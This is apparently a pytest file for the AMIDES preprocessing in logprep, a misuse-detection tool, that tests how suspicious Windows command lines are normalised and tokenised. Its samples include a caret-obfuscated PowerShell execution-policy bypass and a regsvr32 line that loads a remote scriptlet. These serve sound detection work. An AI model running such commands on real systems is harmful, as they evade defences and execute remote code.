# pylint: disable=missing-docstring
# pytest: disable=line-too-long

import pytest

from logprep.processor.amides.features import (
    FilterDummyCharacters,
    Lowercase,
    AnyWordCharacter,
    CommaSeparation,
    NumericValues,
    Strings,
)


class TestPreprocessors:
    samples = [
        'wmic -node:"" process  call  create  "rundll32 c:\\windows\\system32\\shell32.dll, Control_RunDLL"',
        "ps -accepteula \\%ws -u %user% -p %pass% -s cmd /c netstat",
        'C:\\Windows\\System32\\xcopy.exe /S/E/C/Q/H \\client\\"Default User"\\  C:\\Users\\"Default User"\\',
        "C:\\WINDOWS\\system32\\cmd.exe /c P^^o^^w^^e^^r^^S^^h^^e^^l^^l^^.^^e^^x^^e^^ -No^^Exit -Ex^^ec By^^pass -^^EC YwBhAG^^wAYwA=",
        'regsvr32.exe ^^/s ^/n^^ /u^^ /i:"h"t"t"p://<REDACTED>.jpg scrobj.dll',
        "C:\\set_spn.exe -q */*server*",
        "cmd /c assoc .bak= ",
    ]

    expected_filter_dummy = [
        "wmic -node: process  call  create  rundll32 c:\\windows\\system32\\shell32.dll, Control_RunDLL",
        "ps -accepteula \\%ws -u %user% -p %pass% -s cmd /c netstat",
        "C:\\Windows\\System32\\xcopy.exe /S/E/C/Q/H \\client\\Default User\\  C:\\Users\\Default User\\",
        "C:\\WINDOWS\\system32\\cmd.exe /c PowerShell.exe -NoExit -Exec Bypass -EC YwBhAGwAYwA=",
        "regsvr32.exe /s /n /u /i:http://<REDACTED>.jpg scrobj.dll",
        "C:\\set_spn.exe -q */*server*",
        "cmd /c assoc .bak= ",
    ]
    filter_dummy_test_data = list(zip(samples, expected_filter_dummy))

    @pytest.mark.parametrize("sample, expected", filter_dummy_test_data)
    def test_filter_dummy_characters(self, sample, expected):
        preprocessor = FilterDummyCharacters()
        assert preprocessor(sample) == expected

    expected_lowercase = [
        'wmic -node:"" process  call  create  "rundll32 c:\\windows\\system32\\shell32.dll, control_rundll"',
        "ps -accepteula \\%ws -u %user% -p %pass% -s cmd /c netstat",
        'c:\\windows\\system32\\xcopy.exe /s/e/c/q/h \\client\\"default user"\\  c:\\users\\"default user"\\',
        "c:\\windows\\system32\\cmd.exe /c p^^o^^w^^e^^r^^s^^h^^e^^l^^l^^.^^e^^x^^e^^ -no^^exit -ex^^ec by^^pass -^^ec ywbhag^^waywa=",
        'regsvr32.exe ^^/s ^/n^^ /u^^ /i:"h"t"t"p://<redacted>.jpg scrobj.dll',
        "c:\\set_spn.exe -q */*server*",
        "cmd /c assoc .bak= ",
    ]
    lowercase_test_data = list(zip(samples, expected_lowercase))

    @pytest.mark.parametrize("sample, expected", lowercase_test_data)
    def test_lowercase(self, sample, expected):
        preprocessor = Lowercase()
        assert preprocessor(sample) == expected


class TestTokenizer:
    samples = [
        "wmic -node: process  call  create  rundll32 c:\\windows\\system32\\shell32.dll, Control_RunDLL",
        "ps -accepteula \\%ws -u %user% -p %pass% -s cmd /c netstat",
        "C:\\Windows\\System32\\xcopy.exe /S/E/C/Q/H \\client\\Default User\\  C:\\Users\\Default User\\",
        "C:\\WINDOWS\\system32\\cmd.exe /c PowerShell.exe -NoExit -Exec Bypass -EC YwBhAGwAYwA=",
        "regsvr32.exe /s /n /u /i:http://<REDACTED>.jpg scrobj.dll",
        "C:\\set_spn.exe -q */*server*",
        "cmd /c assoc .bak= ",
    ]

    expected_any_word_character = [
        [
            "wmic",
            "node",
            "process",
            "call",
            "create",
            "rundll32",
            "c",
            "windows",
            "system32",
            "shell32",
            "dll",
            "Control_RunDLL",
        ],
        ["ps", "accepteula", "ws", "u", "user", "p", "pass", "s", "cmd", "c", "netstat"],
        [
            "C",
            "Windows",
            "System32",
            "xcopy",
            "exe",
            "S",
            "E",
            "C",
            "Q",
            "H",
            "client",
            "Default",
            "User",
            "C",
            "Users",
            "Default",
            "User",
        ],
        [
            "C",
            "WINDOWS",
            "system32",
            "cmd",
            "exe",
            "c",
            "PowerShell",
            "exe",
            "NoExit",
            "Exec",
            "Bypass",
            "EC",
            "YwBhAGwAYwA",
        ],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "REDACTED", "jpg", "scrobj", "dll"],
        ["C", "set_spn", "exe", "q", "server"],
        ["cmd", "c", "assoc", "bak"],
    ]
    any_word_character_data = list(zip(samples, expected_any_word_character))

    @pytest.mark.parametrize("sample, expected", any_word_character_data)
    def test_any_word_character(self, sample, expected):
        tokenizer = AnyWordCharacter()
        assert tokenizer(sample) == expected

    comma_separation_samples = [
        "regsvr32,exe,s,n,u,i,http,REDACTED,jpg,scrobj,dll",
        "C,set_spn,exe,q,server",
        "cmd,c,assoc,bak",
    ]

    expected_comma_separation = [
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "REDACTED", "jpg", "scrobj", "dll"],
        ["C", "set_spn", "exe", "q", "server"],
        ["cmd", "c", "assoc", "bak"],
    ]
    comma_separation_data = list(zip(comma_separation_samples, expected_comma_separation))

    @pytest.mark.parametrize("sample, expected", comma_separation_data)
    def test_comma_separation(self, sample, expected):
        tokenizer = CommaSeparation()
        assert tokenizer(sample) == expected


class TestTokenFilter:
    samples = [
        [
            "C",
            "WINDOWS",
            "system32",
            "cmd",
            "exe",
            "c",
            "PowerShell",
            "exe",
            "NoExit",
            "Exec",
            "Bypass",
            "EC",
            "YwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBh",
        ],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "cbdfef", "jpg", "scrobj", "dll"],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "cbdfefgh", "jpg", "scrobj", "dll"],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "gjfcbdef", "jpg", "scrobj", "dll"],
        ["cmd", "c", "shutdown", "s", "t", "120000"],
        ["cmd", "c", "shutdown", "s", "t", "0x1234"],
    ]

    expected_numeric_values = [
        [
            "C",
            "WINDOWS",
            "system32",
            "cmd",
            "exe",
            "c",
            "PowerShell",
            "exe",
            "NoExit",
            "Exec",
            "Bypass",
            "EC",
            "YwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBhYwBhAGwAYwAwBh",
        ],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "jpg", "scrobj", "dll"],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "cbdfefgh", "jpg", "scrobj", "dll"],
        ["regsvr32", "exe", "s", "n", "u", "i", "http", "gjfcbdef", "jpg", "scrobj", "dll"],
        ["cmd", "c", "shutdown", "s", "t"],
        ["cmd", "c", "shutdown", "s", "t"],
    ]

    numeric_values_data = list(zip(samples, expected_numeric_values))

    @pytest.mark.parametrize("sample, expected", numeric_values_data)
    def test_numeric_values(self, sample, expected):
        nv_filter = NumericValues(length=3)
        assert nv_filter(sample) == expected

    expected_strings = [
        [
            "C",
            "WINDOWS",
            "cmd",
            "exe",
            "c",
            "exe",
            "NoExit",
            "Exec",
            "Bypass",
            "EC",
        ],
        ["exe", "s", "n", "u", "i", "http", "cbdfef", "jpg", "scrobj", "dll"],
        ["exe", "s", "n", "u", "i", "http", "jpg", "scrobj", "dll"],
        ["exe", "s", "n", "u", "i", "http", "jpg", "scrobj", "dll"],
        ["cmd", "c", "s", "t", "120000"],
        ["cmd", "c", "s", "t", "0x1234"],
    ]

    string_data = list(zip(samples, expected_strings))

    @pytest.mark.parametrize("sample, expected", string_data)
    def test_string_values(self, sample, expected):
        string_filter = Strings(length=7)
        assert string_filter(sample) == expected
